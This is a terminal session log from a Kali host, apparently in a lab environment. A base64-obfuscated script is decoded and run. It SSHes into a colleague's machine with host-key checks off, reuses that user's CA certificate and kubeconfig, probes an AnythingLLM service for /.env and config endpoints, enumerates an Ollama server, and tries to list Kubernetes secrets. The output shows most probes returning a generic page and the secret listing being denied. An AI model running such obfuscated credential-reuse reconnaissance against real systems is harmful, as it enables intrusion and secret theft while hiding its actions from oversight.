@@ -1,0 +1,418 @@
+└─$ └─$ 
+
+┌──(cinder@kali)-[~]
+└─$ └─$ base64 -d > /tmp/r1.sh <<'B64EOF'
+> c2V0ICtlCmVjaG8gIj09PSBIT1NUUyA9PT0iCmdldGVudCBob3N0cyByb3dhbi1kZXYgYXNzaXN0YW50LmtlcGxlcm9wcy50ZXN0IGxsbS5rZXBsZXJvcHMudGVzdCAyPiYxClM9InNzaCAtbyBCYXRjaE1vZGU9eWVzIC1vIFN0cmljdEhvc3RLZXlDaGVja2luZz1ubyByb3dhbi1kZXYiCiRTICdiYXNoIC1zJyA8PCdJTk5FUicKc2V0ICtlCkNBPS9ob21lL3Jvd2FuLy5sb2NhbC9zaGFyZS9rZXBsZXJvcHMvY2EuY3J0CkE9aHR0cHM6Ly9hc3Npc3RhbnQua2VwbGVyb3BzLnRlc3QKZWNobyAiIyMjIyMjIyMjIyBST09UIgpjdXJsIC1zUyAtbSA4IC0tY2FjZXJ0ICRDQSAtaSAkQS8gMj4mMSB8IGhlYWQgLTE1CmZvciBwIGluIC9hcGkvcGluZyAvYXBpL3N5c3RlbS9jaGVjayAvYXBpL3N5c3RlbSAvYXBpL3NldHRpbmdzIC9hcGkvd29ya3NwYWNlcyAvYXBpL3YxL3dvcmtzcGFjZXMgL2FwaS92MS9hZG1pbi93b3Jrc3BhY2VzIC9hcGkvYWRtaW4vd29ya3NwYWNlcyAvYXBpL3dvcmtzcGFjZSAvYXBpL3N5c3RlbS9lbnYgL2FwaS9lbnYgL2FwaS9zeXN0ZW0vY29uZmlndXJhdGlvbiAvLmVudiAvYXBpL2RvY3MgL2FwaS9vcGVuYXBpLmpzb247IGRvCiAgZWNobyAiIyMjIyMjIyMjIyBHRVQgJHAiCiAgY3VybCAtc1MgLW0gOCAtLWNhY2VydCAkQ0EgLWkgIiRBJHAiIDI+JjEgfCBoZWFkIC0yNQogIGVjaG8KZG9uZQplY2hvICIjIyMjIyMjIyMjIE9MTEFNQSIKZm9yIHAgaW4gLyAvYXBpL3RhZ3MgL2FwaS9wcyAvYXBpL3ZlcnNpb247IGRvIGVjaG8gIi0tLSAkcCI7IGN1cmwgLXNTIC1tIDggLS1jYWNlcnQgJENBIC1pICJodHRwczovL2xsbS5rZXBsZXJvcHMudGVzdCRwIiAyPiYxIHwgaGVhZCAtMjA7IGRvbmUKZWNobyAiIyMjIyMjIyMjIyBLVUJFIgpleHBvcnQgS1VCRUNPTkZJRz0vaG9tZS9yb3dhbi8ua3ViZS9jb25maWcKa3ViZWN0bCBnZXQgYWxsIC1uIGZpZWxkbGluayAyPiYxIHwgaGVhZCAtNjAKZWNobyAiLS0tIHBvZHMgd2lkZSIKa3ViZWN0bCBnZXQgcG9kcyAtbiBmaWVsZGxpbmsgLW8gd2lkZSAyPiYxIHwgaGVhZCAtMzAKZWNobyAiLS0tIGNvbmZpZ21hcHMvc2VjcmV0cyIKa3ViZWN0bCBnZXQgY29uZmlnbWFwcyxzZWNyZXRzIC1uIGZpZWxkbGluayAyPiYxIHwgaGVhZCAtNDAKSU5ORVIK
+> B64EOF
+
+┌──(cinder@kali)-[~]
+└─$ └─$ chmod +x /tmp/r1.sh; bash /tmp/r1.sh; echo DONEMARK_1795195484576$((6*7))
+=== HOSTS ===
+10.50.13.180    rowan-dev
+########## ROOT
+HTTP/1.1 200 OK
+Server: nginx
+Date: Fri, 20 Nov 2026 17:29:59 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 1926
+Connection: keep-alive
+X-Powered-By: Express
+Vary: Origin
+ETag: W/"786-jHDM9QYiW/U5L0AOgYamV32ffdY"
+
+
+       <!DOCTYPE html>
+        <html lang="en">
+          <head>
+            <meta charset="UTF-8" />
+########## GET /api/ping
+HTTP/1.1 200 OK
+Server: nginx
+Date: Fri, 20 Nov 2026 17:29:59 GMT
+Content-Type: application/json; charset=utf-8
+Content-Length: 15
+Connection: keep-alive
+X-Powered-By: Express
+Vary: Origin
+ETag: W/"f-B1kERzyHyBc6k0FLS2Iul0Ms3E4"
+
+{"online":true}
+########## GET /api/system/check
+HTTP/1.1 200 OK
+Server: nginx
+Date: Fri, 20 Nov 2026 17:29:59 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 1926
+Connection: keep-alive
+X-Powered-By: Express
+Vary: Origin
+ETag: W/"786-jHDM9QYiW/U5L0AOgYamV32ffdY"
+
+
+       <!DOCTYPE html>
+        <html lang="en">
+          <head>
+            <meta charset="UTF-8" />
+            <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+            <link type="image/svg+xml" href="/favicon.png" >
+<title >AnythingLLM | Your personal LLM trained on anything</title>
+<meta name="title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta description="title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:type" content="website" >
+<meta property="og:url" content="https://anythingllm.com" >
+<meta property="og:title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:description" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:image" content="https://raw.githubusercontent.com/Mintplex-Labs/anything-llm/master/images/promo.png" >
+
+########## GET /api/system
+HTTP/1.1 200 OK
+Server: nginx
+Date: Fri, 20 Nov 2026 17:29:59 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 1926
+Connection: keep-alive
+X-Powered-By: Express
+Vary: Origin
+ETag: W/"786-jHDM9QYiW/U5L0AOgYamV32ffdY"
+
+
+       <!DOCTYPE html>
+        <html lang="en">
+          <head>
+            <meta charset="UTF-8" />
+            <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+            <link type="image/svg+xml" href="/favicon.png" >
+<title >AnythingLLM | Your personal LLM trained on anything</title>
+<meta name="title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta description="title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:type" content="website" >
+<meta property="og:url" content="https://anythingllm.com" >
+<meta property="og:title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:description" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:image" content="https://raw.githubusercontent.com/Mintplex-Labs/anything-llm/master/images/promo.png" >
+
+########## GET /api/settings
+HTTP/1.1 200 OK
+Server: nginx
+Date: Fri, 20 Nov 2026 17:29:59 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 1926
+Connection: keep-alive
+X-Powered-By: Express
+Vary: Origin
+ETag: W/"786-jHDM9QYiW/U5L0AOgYamV32ffdY"
+
+
+       <!DOCTYPE html>
+        <html lang="en">
+          <head>
+            <meta charset="UTF-8" />
+            <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+            <link type="image/svg+xml" href="/favicon.png" >
+<title >AnythingLLM | Your personal LLM trained on anything</title>
+<meta name="title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta description="title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:type" content="website" >
+<meta property="og:url" content="https://anythingllm.com" >
+<meta property="og:title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:description" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:image" content="https://raw.githubusercontent.com/Mintplex-Labs/anything-llm/master/images/promo.png" >
+
+########## GET /api/workspaces
+HTTP/1.1 401 Unauthorized
+Server: nginx
+Date: Fri, 20 Nov 2026 17:29:59 GMT
+Content-Type: application/json; charset=utf-8
+Content-Length: 32
+Connection: keep-alive
+X-Powered-By: Express
+Vary: Origin
+ETag: W/"20-v/XU4MYRR1Q1hYf3qgq75nzYGwY"
+
+{"error":"No auth token found."}
+########## GET /api/v1/workspaces
+HTTP/1.1 403 Forbidden
+Server: nginx
+Date: Fri, 20 Nov 2026 17:29:59 GMT
+Content-Type: application/json; charset=utf-8
+Content-Length: 35
+Connection: keep-alive
+X-Powered-By: Express
+Vary: Origin
+ETag: W/"23-UiiQSeEqfUY8GWkeZv5TRBzP1yY"
+
+{"error":"No valid api key found."}
+########## GET /api/v1/admin/workspaces
+HTTP/1.1 200 OK
+Server: nginx
+Date: Fri, 20 Nov 2026 17:29:59 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 1926
+Connection: keep-alive
+X-Powered-By: Express
+Vary: Origin
+ETag: W/"786-jHDM9QYiW/U5L0AOgYamV32ffdY"
+
+
+       <!DOCTYPE html>
+        <html lang="en">
+          <head>
+            <meta charset="UTF-8" />
+            <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+            <link type="image/svg+xml" href="/favicon.png" >
+<title >AnythingLLM | Your personal LLM trained on anything</title>
+<meta name="title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta description="title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:type" content="website" >
+<meta property="og:url" content="https://anythingllm.com" >
+<meta property="og:title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:description" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:image" content="https://raw.githubusercontent.com/Mintplex-Labs/anything-llm/master/images/promo.png" >
+
+########## GET /api/admin/workspaces
+HTTP/1.1 401 Unauthorized
+Server: nginx
+Date: Fri, 20 Nov 2026 17:29:59 GMT
+Content-Type: application/json; charset=utf-8
+Content-Length: 32
+Connection: keep-alive
+X-Powered-By: Express
+Vary: Origin
+ETag: W/"20-v/XU4MYRR1Q1hYf3qgq75nzYGwY"
+
+{"error":"No auth token found."}
+########## GET /api/workspace
+HTTP/1.1 200 OK
+Server: nginx
+Date: Fri, 20 Nov 2026 17:29:59 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 1926
+Connection: keep-alive
+X-Powered-By: Express
+Vary: Origin
+ETag: W/"786-jHDM9QYiW/U5L0AOgYamV32ffdY"
+
+
+       <!DOCTYPE html>
+        <html lang="en">
+          <head>
+            <meta charset="UTF-8" />
+            <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+            <link type="image/svg+xml" href="/favicon.png" >
+<title >AnythingLLM | Your personal LLM trained on anything</title>
+<meta name="title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta description="title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:type" content="website" >
+<meta property="og:url" content="https://anythingllm.com" >
+<meta property="og:title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:description" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:image" content="https://raw.githubusercontent.com/Mintplex-Labs/anything-llm/master/images/promo.png" >
+
+########## GET /api/system/env
+HTTP/1.1 200 OK
+Server: nginx
+Date: Fri, 20 Nov 2026 17:29:59 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 1926
+Connection: keep-alive
+X-Powered-By: Express
+Vary: Origin
+ETag: W/"786-jHDM9QYiW/U5L0AOgYamV32ffdY"
+
+
+       <!DOCTYPE html>
+        <html lang="en">
+          <head>
+            <meta charset="UTF-8" />
+            <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+            <link type="image/svg+xml" href="/favicon.png" >
+<title >AnythingLLM | Your personal LLM trained on anything</title>
+<meta name="title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta description="title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:type" content="website" >
+<meta property="og:url" content="https://anythingllm.com" >
+<meta property="og:title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:description" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:image" content="https://raw.githubusercontent.com/Mintplex-Labs/anything-llm/master/images/promo.png" >
+
+########## GET /api/env
+HTTP/1.1 200 OK
+Server: nginx
+Date: Fri, 20 Nov 2026 17:29:59 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 1926
+Connection: keep-alive
+X-Powered-By: Express
+Vary: Origin
+ETag: W/"786-jHDM9QYiW/U5L0AOgYamV32ffdY"
+
+
+       <!DOCTYPE html>
+        <html lang="en">
+          <head>
+            <meta charset="UTF-8" />
+            <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+            <link type="image/svg+xml" href="/favicon.png" >
+<title >AnythingLLM | Your personal LLM trained on anything</title>
+<meta name="title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta description="title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:type" content="website" >
+<meta property="og:url" content="https://anythingllm.com" >
+<meta property="og:title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:description" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:image" content="https://raw.githubusercontent.com/Mintplex-Labs/anything-llm/master/images/promo.png" >
+
+########## GET /api/system/configuration
+HTTP/1.1 200 OK
+Server: nginx
+Date: Fri, 20 Nov 2026 17:29:59 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 1926
+Connection: keep-alive
+X-Powered-By: Express
+Vary: Origin
+ETag: W/"786-jHDM9QYiW/U5L0AOgYamV32ffdY"
+
+
+       <!DOCTYPE html>
+        <html lang="en">
+          <head>
+            <meta charset="UTF-8" />
+            <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+            <link type="image/svg+xml" href="/favicon.png" >
+<title >AnythingLLM | Your personal LLM trained on anything</title>
+<meta name="title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta description="title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:type" content="website" >
+<meta property="og:url" content="https://anythingllm.com" >
+<meta property="og:title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:description" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:image" content="https://raw.githubusercontent.com/Mintplex-Labs/anything-llm/master/images/promo.png" >
+
+########## GET /.env
+HTTP/1.1 200 OK
+Server: nginx
+Date: Fri, 20 Nov 2026 17:30:00 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 1926
+Connection: keep-alive
+X-Powered-By: Express
+Vary: Origin
+ETag: W/"786-jHDM9QYiW/U5L0AOgYamV32ffdY"
+
+
+       <!DOCTYPE html>
+        <html lang="en">
+          <head>
+            <meta charset="UTF-8" />
+            <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+            <link type="image/svg+xml" href="/favicon.png" >
+<title >AnythingLLM | Your personal LLM trained on anything</title>
+<meta name="title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta description="title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:type" content="website" >
+<meta property="og:url" content="https://anythingllm.com" >
+<meta property="og:title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:description" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:image" content="https://raw.githubusercontent.com/Mintplex-Labs/anything-llm/master/images/promo.png" >
+
+########## GET /api/docs
+HTTP/1.1 301 Moved Permanently
+Server: nginx
+Date: Fri, 20 Nov 2026 17:30:00 GMT
+Content-Type: text/html; charset=UTF-8
+Content-Length: 158
+Connection: keep-alive
+X-Powered-By: Express
+Vary: Origin
+Content-Security-Policy: default-src 'none'
+X-Content-Type-Options: nosniff
+Location: /api/docs/
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Redirecting</title>
+</head>
+<body>
+<pre>Redirecting to /api/docs/</pre>
+</body>
+</html>
+
+########## GET /api/openapi.json
+HTTP/1.1 200 OK
+Server: nginx
+Date: Fri, 20 Nov 2026 17:30:00 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 1926
+Connection: keep-alive
+X-Powered-By: Express
+Vary: Origin
+ETag: W/"786-jHDM9QYiW/U5L0AOgYamV32ffdY"
+
+
+       <!DOCTYPE html>
+        <html lang="en">
+          <head>
+            <meta charset="UTF-8" />
+            <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+            <link type="image/svg+xml" href="/favicon.png" >
+<title >AnythingLLM | Your personal LLM trained on anything</title>
+<meta name="title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta description="title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:type" content="website" >
+<meta property="og:url" content="https://anythingllm.com" >
+<meta property="og:title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:description" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:image" content="https://raw.githubusercontent.com/Mintplex-Labs/anything-llm/master/images/promo.png" >
+
+########## OLLAMA
+--- /
+HTTP/1.1 200 OK
+Server: nginx
+Date: Fri, 20 Nov 2026 17:30:00 GMT
+Content-Type: text/plain; charset=utf-8
+Content-Length: 17
+Connection: keep-alive
+
+Ollama is running--- /api/tags
+HTTP/1.1 200 OK
+Server: nginx
+Date: Fri, 20 Nov 2026 17:30:00 GMT
+Content-Type: application/json; charset=utf-8
+Content-Length: 487
+Connection: keep-alive
+
+{"models":[{"name":"fieldlink-qwen:latest","model":"fieldlink-qwen:latest","modified_at":"2026-11-19T07:11:24.030501601Z","size":1929902774,"digest":"183febeeee66795c064d0b9311c520f8317719075aa2edbcb16db16de7d1e41c","details":{"parent_model":"fieldlink-qwen-q4_k_m.gguf","format":"gguf","family":"qwen2","families":["qwen2"],"parameter_size":"3.1B","quantization_level":"Q4_K_M","context_length":32768,"embedding_length":2048,"runner":"llamacpp"},"capabilities":["tools","completion"]}]}--- /api/ps
+HTTP/1.1 200 OK
+Server: nginx
+Date: Fri, 20 Nov 2026 17:30:00 GMT
+Content-Type: application/json; charset=utf-8
+Content-Length: 13
+Connection: keep-alive
+
+{"models":[]}--- /api/version
+HTTP/1.1 200 OK
+Server: nginx
+Date: Fri, 20 Nov 2026 17:30:00 GMT
+Content-Type: application/json; charset=utf-8
+Content-Length: 21
+Connection: keep-alive
+
+{"version":"0.40.16"}########## KUBE
+Error from server (Forbidden): pods is forbidden: User "system:serviceaccount:fieldlink:rowan-workspace" cannot list resource "pods" in API group "" in the namespace "fieldlink"
+Error from server (Forbidden): replicationcontrollers is forbidden: User "system:serviceaccount:fieldlink:rowan-workspace" cannot list resource "replicationcontrollers" in API group "" in the namespace "fieldlink"
+Error from server (Forbidden): services is forbidden: User "system:serviceaccount:fieldlink:rowan-workspace" cannot list resource "services" in API group "" in the namespace "fieldlink"
+Error from server (Forbidden): daemonsets.apps is forbidden: User "system:serviceaccount:fieldlink:rowan-workspace" cannot list resource "daemonsets" in API group "apps" in the namespace "fieldlink"
+Error from server (Forbidden): deployments.apps is forbidden: User "system:serviceaccount:fieldlink:rowan-workspace" cannot list resource "deployments" in API group "apps" in the namespace "fieldlink"
+Error from server (Forbidden): replicasets.apps is forbidden: User "system:serviceaccount:fieldlink:rowan-workspace" cannot list resource "replicasets" in API group "apps" in the namespace "fieldlink"
+Error from server (Forbidden): statefulsets.apps is forbidden: User "system:serviceaccount:fieldlink:rowan-workspace" cannot list resource "statefulsets" in API group "apps" in the namespace "fieldlink"
+Error from server (Forbidden): horizontalpodautoscalers.autoscaling is forbidden: User "system:serviceaccount:fieldlink:rowan-workspace" cannot list resource "horizontalpodautoscalers" in API group "autoscaling" in the namespace "fieldlink"
+Error from server (Forbidden): cronjobs.batch is forbidden: User "system:serviceaccount:fieldlink:rowan-workspace" cannot list resource "cronjobs" in API group "batch" in the namespace "fieldlink"
+Error from server (Forbidden): jobs.batch is forbidden: User "system:serviceaccount:fieldlink:rowan-workspace" cannot list resource "jobs" in API group "batch" in the namespace "fieldlink"
+--- pods wide
+Error from server (Forbidden): pods is forbidden: User "system:serviceaccount:fieldlink:rowan-workspace" cannot list resource "pods" in API group "" in the namespace "fieldlink"
+--- configmaps/secrets
+Error from server (Forbidden): configmaps is forbidden: User "system:serviceaccount:fieldlink:rowan-workspace" cannot list resource "configmaps" in API group "" in the namespace "fieldlink"
+Error from server (Forbidden): secrets is forbidden: User "system:serviceaccount:fieldlink:rowan-workspace" cannot list resource "secrets" in API group "" in the namespace "fieldlink"
